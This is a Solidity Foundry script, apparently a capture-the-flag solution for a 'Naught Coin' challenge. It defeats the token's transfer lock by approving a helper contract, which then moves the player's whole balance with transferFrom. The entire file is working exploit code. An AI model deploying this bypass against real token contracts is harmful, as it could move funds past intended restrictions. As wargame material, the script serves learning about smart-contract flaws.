// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../lib/forge-std/src/Script.sol";
import {HelperConfigLib} from "./config/HelperConfig.sol";

interface INaughtCoin {
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function approve(address spender, uint256 value) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

contract NaughtCoinAttacker is Script, HelperConfigLib {
    function run(address _ncAddr, address _playerAddr) external {
        vm.startBroadcast();

        INaughtCoin ncCoin = INaughtCoin(_ncAddr);
        TransferContract transferContr = new TransferContract();

        uint256 playerBalance = ncCoin.balanceOf(_playerAddr);

        ncCoin.approve(address(transferContr), playerBalance);
        transferContr.transferToMe(_ncAddr, _playerAddr, playerBalance);

        vm.stopBroadcast();
    }
}

contract TransferContract {
    function transferToMe(
        address _ncAddr,
        address _playerAddr,
        uint256 _amount
    ) public {
        INaughtCoin ncCoin = INaughtCoin(_ncAddr);
        bool success = ncCoin.transferFrom(_playerAddr, address(this), _amount);
        require(success == true, "Transfer-To-Me failed");
    }
}
